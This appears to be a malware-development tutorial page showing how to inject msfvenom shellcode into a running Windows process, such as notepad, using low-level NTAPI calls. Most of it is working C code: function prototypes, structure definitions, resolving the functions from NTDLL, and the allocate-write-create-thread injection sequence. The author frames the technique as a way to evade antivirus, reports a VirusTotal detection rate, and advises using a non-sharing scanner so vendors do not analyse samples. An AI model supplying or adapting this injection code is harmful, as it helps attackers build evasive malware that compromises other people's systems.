---
description: Process Injection using the low level NTAPI functions
---

# NTAPI Implementation

## Introduction

As we know that when we call any windows API function like [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess), it first finds the function in the `kernel32.dll` which in turn calls the same function in the `kernelbase.dll` which would then call the `NtOpenProcess / ZwOpenProcess` function present in the `NTDLL.dll` which then finally does the system call and the execution is moved to kernel mode from where the result is returned accordingly. The Execution Flow is something like this :&#x20;

<mark style="color:orange;">**`OpenProcess (API / Kernel32.dll) --> OpenProcess (Kernelbase.dll)  --> NtOpenProcess (NTAPI) --> syscall --> Kernel Mode --> Result`**</mark>

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption><p>image from redops.at</p></figcaption></figure>

And as we know that the lower we go , the more control we have over our Malware, the better we can understand / write our malware and thus, the better we can evade antivirus programs. I'll show how we can use the low-level NTAPI functions to inject our shellcode into any legitimate process.

## Initial Setup

### Defining Structures

We need to have some structures predefined, although some of it isn't necessary (I'll let you know which ones) but it's a good practice to do so, especially as someone who is learning. It's better to have a different header file in C which we will include later in our main program. Let's start by defining function prototypes. This is basically us telling the compiler what to expect in the parameters of those functions since these functions are not defined so the compiler doesn't know.&#x20;

```c
// Function Prototypes
typedef NTSTATUS(NTAPI* NtOpenProcess) (
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientID
    );
    
typedef NTSTATUS(NTAPI* NtCreateThreadEx) (
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );

typedef NTSTATUS(NTAPI* NtClose) (
    _In_ _Post_ptr_invalid_ HANDLE Handle
    );

typedef NTSTATUS (NTAPI* NtAllocateVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

typedef NTSTATUS (NTAPI* NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);
```

Some functions can be found on MSDN page itself like the [NtOpenProcess](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess) function, and for rest we can use websites like [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/) (for older windows versions like XP / 7) or [https://ntdoc.m417z.com/ntallocatevirtualmemory](https://ntdoc.m417z.com/ntallocatevirtualmemory) which tells the structure of the function, note that the function types / structures which are marked in blue might need to be declared in the code and we can click on it to see how to do so. Then we also need to define some structures (which were marked in blue on the site). Although we can just include the necessary header files, but in some case it might lead to some other redefinition issues, etc. like for `CLIENT_ID` and `OBJECT_ATTRIBUTES` we can actually just use the `winternl.h` header file but then we might have to change the name for NtClose function since it is present in the header file and we are re-defining it (we can just comment out our definition as well which will solve the problem).&#x20;

```c
//0x30 bytes (sizeof)
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;                                                           //0x0
    VOID* RootDirectory;                                                    //0x8
    struct _UNICODE_STRING* ObjectName;                                     //0x10
    ULONG Attributes;                                                       //0x18
    VOID* SecurityDescriptor;                                               //0x20
    VOID* SecurityQualityOfService;                                         //0x28
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

//0x10 bytes (sizeof)
typedef struct _CLIENT_ID
{
    VOID* UniqueProcess;                                                    //0x0
    VOID* UniqueThread;                                                     //0x8
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
```

With all of this, now we are ready to write our main program.

### Loading NTAPI functions

To call the NTAPI functions, we would first need to get a Handle to the NTDLL file from where we would get the address of the necessary functions required. Then we would call those accordingly. Also we would have to initialize necessary parameters. We can use functions like [`GetModuleHandle`](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlew) and [`GetProcAddress`](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) for this. Note that these functions being present in a binary's IAT is an indicator of malware.

What we are doing here is getting the address of the function, so if `NtOpenProcess` is at `0x702E` then we save that address to a function pointer `pOpen` and then call this function (which points to the original `NtOpenProcess`) and pass necessary arguments.

```c
HMODULE hNTDLL = GetModuleHandleW(L"NTDLL.DLL");

NtOpenProcess pOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
NtCreateThreadEx pCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
NtAllocateVirtualMemory pAllocate = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL ,"NtAllocateVirtualMemory");
NtWriteVirtualMemory pWrite = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
NtClose pClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");

// parameters for NtOpenProcess
OBJECT_ATTRIBUTES oAttrib = { sizeof(oAttrib), NULL };
CLIENT_ID cID = { (HANDLE)pID, NULL };
```

The NTAPI functions have similar parameters to what their high level counterparts along with additional parameters. [`OBJECT_ATTRIBUTES`](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) & [`CLIENT_ID` ](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/a11e7129-685b-4535-8d37-21d4596ac057)are 2 such parameters used in the `NtOpenProcess` function. [`OBJECT_ATTRIBUTES`](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) is the structure which specifies the attributes to apply to the object (as the name suggests), and the [`CLIENT_ID`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/a11e7129-685b-4535-8d37-21d4596ac057) helps identifying the thread whose process is to be opened. \
Basically, at least one of the two structure objects (Process Handle / Thread Handle) should be specified (not NULL). In our case, we have specified the Process Handle, you can definitely try creating another thread and then supplying that to check out the behavior, Learning is all about tinkering with stuff (make sure you have debug statements). That being said we can know move on to the exciting part

## NTAPI Process Injection

Well this part is quite similar to the "OG" Process Injection and if you are aware of it then you might see the similarities between the two. We just need to perform the same steps / call same functions as we did previously in [Process Injection](https://reze.gitbook.io/bin/maldev/process-injection).&#x20;

```c
NTSTATUS STATUS = NULL;
SIZE_T szShellcode = sizeof(shellcode);

// NtOpenProcess
STATUS = pOpen(&hProcess, PROCESS_ALL_ACCESS, &oAttrib, &cID);
if (STATUS != STATUS_SUCCESS) {
    warn("NtOpenProcess failed, STATUS @---0x%lx", STATUS);
    return EXIT_FAILURE;
}
else {
    okay("Got Handle to the Process %ld @---0x%p",pID, hProcess);
}
// NtAllocateVirtualMemory
STATUS = pAllocate(hProcess, &rBuffer, NULL, &szShellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
// NtWriteVirtualMemory
STATUS = pWrite(hProcess, rBuffer, bin, sizeof(bin), &bytesWritten);
// NtCreateThreadEx
STATUS = pCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oAttrib, hProcess, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, 0);
WaitForSingleObject(hProcess, INFINITE);
// NtClose
STATUS = pClose(hThread);
STATUS = pClose(hProcess);
```

I've removed most of the debug statement except one just to give an idea on how I debug my code. As you see, we first open a Handle to the process, then Allocate Virtual Memory of the size of our shellcode, Write our shellcode into the memory and then create a thread to run our shellcode and finally wait for it to complete it's execution.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption><p>Injecting shellcode to notepad</p></figcaption></figure>

And we have finally implemented Process Injection using the low-level NTAPI functions. I would also later show how we can leverage system calls (Direct & Indirect) to perform Process Injection. It is definitely a fact that we would face some issues even when simply performing same steps as what we see on any website and that's why it is **importante** to add debug statements to our code.

## VirusTotal

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>VirusTotal Detection</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It is 28/72 and tbh most of it is because of the shellcode we are using which is generated by **msfvenom** which is heavily signatured and as a result easy to identify. Here's the hash if anyone's curious `31e217a135154fd66d54e05e0c2d1e8f3001c91a26d2f8b2f8b4ffc74ff708ce`

Later we will also discuss how can we lower this number more to eventually single digits less than 5 and hopefully 0 as well. But know that your samples are shared with different AV vendors so if you don't want them to analyze your "malware", you can use better alternatives like [Antiscan](https://antiscan.me/).
